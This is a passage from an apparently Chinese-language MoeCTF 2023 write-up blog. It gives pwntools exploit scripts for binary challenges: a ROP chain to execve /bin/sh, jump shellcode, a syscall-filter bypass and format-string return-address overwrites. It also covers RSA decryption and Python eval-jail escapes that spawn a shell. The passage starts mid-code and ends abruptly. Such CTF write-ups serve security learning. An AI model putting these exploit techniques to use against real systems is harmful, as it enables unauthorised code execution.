class="string">&#x27;i&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[1] == v7[3] v7[3] == 9</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">14</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># strncat((char *)s, &amp;src[v7[6]], 1uLL); v7[6] == 0</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[0] == v7[2]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[3] - v7[4] == v7[0]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./rePWNse&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.102&quot;</span></span><br><span class="line">    port = <span class="number">49704</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input seven single digits:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="literal">None</span>] * <span class="number">7</span></span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">9</span></span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">9</span></span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">6</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    sl(<span class="built_in">str</span>(v7[i]).encode())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;The address is:&quot;</span>)</span><br><span class="line">binsh = <span class="built_in">int</span>(rl()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x000000000040168e</span></span><br><span class="line">execve = <span class="number">0x40129B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>),</span><br><span class="line">    rdi,binsh,execve</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level3-补"><a href="#shellcode-level3-补" class="headerlink" title="shellcode_level3[补]"></a>shellcode_level3[补]</h2><p>gets(code) 输入的位置，只有前五个字节有可执行的权限，有一个backdoor function，jmp 过去就好了， jmp的字节码是e9，相对寻址(rip) 后面跟的是一个偏移地址，算一下code的地址到backdoor的偏移是多少，转换成补码就好了，注意一下端序是小端序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5 bytes ni neng miao sha wo?&quot;</span>);</span><br><span class="line">  mprotect(&amp;GLOBAL_OFFSET_TABLE_, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  gets(&amp;code);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;unk_40408E, <span class="number">0</span>, <span class="number">0xF72</span>uLL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))code)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">givemeshell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shellcode_level3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">57295</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 40408E - 4011D6 = 11960 # -11960的补码是 48d1ffff, 小端序</span></span><br><span class="line">shellcode = <span class="string">b&quot;\xe9\x48\xd1\xff\xff&quot;</span></span><br><span class="line">sl(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="changeable-shellcode-补"><a href="#changeable-shellcode-补" class="headerlink" title="changeable_shellcode [补]"></a>changeable_shellcode [补]</h2><p>有一个filter函数，把syscall给过滤了，那能不能在shellcode中，造一个syscall出来？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">filter</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">15</span> &amp;&amp; buf[i + <span class="number">1</span>] == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Is that &#x27;syscall&#x27;?&quot;</span>);</span><br><span class="line">      buf[i] = <span class="number">0</span>;</span><br><span class="line">      buf[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oh, nothing.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>b’\x0f\x00’，把\x00修改成 05就是syscall的字节码了，这个偏移可以通过字符串长度来算，因为00是在结尾的 len -1 就是偏移了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">54025</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode1 += <span class="string">b&#x27;\x0f\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line"><span class="built_in">print</span>(shellcode1[<span class="number">21</span>])</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov al, 0x05</span></span><br><span class="line"><span class="string">    mov [0x114514020], al</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = shellcode2 + shellcode1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(payload[<span class="built_in">len</span>(payload) - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="format-level2-补"><a href="#format-level2-补" class="headerlink" title="format_level2[补]"></a>format_level2[补]</h2><p>got表不可改，有一个cat flag的backdoor函数，先用格式化字符串泄露一个栈相关的地址，利用偏移算出main的返回地址，然后把main的返回地址的低位修改成backdoor的低位，这样就能jmp到backdoor上了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./format_level2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">51366</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(<span class="string">&quot;%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;You said: \n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(ru(<span class="string">&#x27;But&#x27;</span>)[:-<span class="number">3</span>], <span class="number">16</span>)</span><br><span class="line">ret_addr = leak_addr + <span class="number">64</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 08049317</span></span><br><span class="line">payload = <span class="string">b&quot;%23p%10$hhn&quot;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(ret_addr)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%147p%10$hhn&quot;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(ret_addr + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a>Crypto 入门指北</h2><p>去查询了一下指北里面的信息</p>
<p>欧拉函数 的定义是小于等于n和n互质数的个数，n是质数的时候则为n-1</p>
<p>然后 ax mod b &#x3D; 1的时候，x则称作a mod b的逆元，是a的倒数</p>
<p>所以d &#x3D; pow(e, -1, phi)这个是这么来的</p>
<p>得到私钥后就直接解密拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># 一个非常好用的crypto库</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7</span></span><br><span class="line">q = <span class="number">0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb</span></span><br><span class="line">c = <span class="number">0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>) <span class="comment"># 你知道什么是 欧拉函数吗 [1]</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi) <span class="comment"># 什么是乘法逆元？ [2]</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h2><h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><p>jail挺好玩的，思路开阔了很多</p>
<p>参考的这个文章学习的<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p>
<h2 id="Jail-lavel-0"><a href="#Jail-lavel-0" class="headerlink" title="Jail lavel 0"></a>Jail lavel 0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>可以用__ import __来导入os模块使用system来执行系统命令,import魔术方法使用import导入模块的时候，会调用import魔术方法。import魔术方法可以用来动调加载模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{0dAAkA3NNdFaoIDhHrqY35M60amn3_Cs}</p>
<h2 id="Jail-lavel-1"><a href="#Jail-lavel-1" class="headerlink" title="Jail lavel 1"></a>Jail lavel 1</h2><p>这里多了个长度限制，lv0的payload用不了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

